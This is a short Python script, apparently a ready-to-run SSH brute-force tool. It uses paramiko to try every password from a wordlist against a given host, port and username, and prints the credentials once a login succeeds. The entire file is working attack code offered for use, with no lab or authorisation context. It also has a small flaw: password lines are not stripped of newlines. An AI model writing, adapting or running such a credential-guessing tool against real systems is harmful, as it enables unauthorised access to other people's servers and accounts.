from colorama import Fore, Style, init
import paramiko
import sys

try:
    host = sys.argv[1]
    port = sys.argv[2]
    username = sys.argv[3]
    pass_list = sys.argv[4]
except IndexError:
    print(f'{Fore.LIGHTRED_EX}{Style.BRIGHT}python3 <host> <port> <username> <pass_list>')

init()

class Brute:
    def __init__(self, host, port, username, pass_list):
        self.host = host
        self.port = port
        self.username = username
        self.pass_list = pass_list

    def run(self):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy)

        with open(self.pass_list, 'r') as passwords:
            passwd = passwords.readline()

            while passwd:
                print(f'{Fore.WHITE}Trying password - {passwd}')
                try:
                    client.connect(hostname=self.host, port=self.port, username=self.username, password=passwd)
                    print(f'{Fore.LIGHTGREEN_EX}{Style.BRIGHT}Login Sucessful! Username: {self.username}, Password: {passwd}')
                    break
                except TimeoutError:
                    print(f'{Fore.LIGHTRED_EX}{Style.BRIGHT}Unable to reach host.')
                    break
                except paramiko.ssh_exception.NoValidConnectionsError:
                    print(f'{Fore.LIGHTRED_EX}{Style.BRIGHT}Unable to reach host.')
                    break
                except paramiko.ssh_exception.AuthenticationException:
                    passwd = passwords.readline()
                    continue
                except Exception as e:
                    print(f'{Fore.LIGHTRED_EX}{Style.BRIGHT}An Unknown Error Occured!')
                    print(e)
                    break

try:
    Brute(host, port, username, pass_list).run()
except:
    pass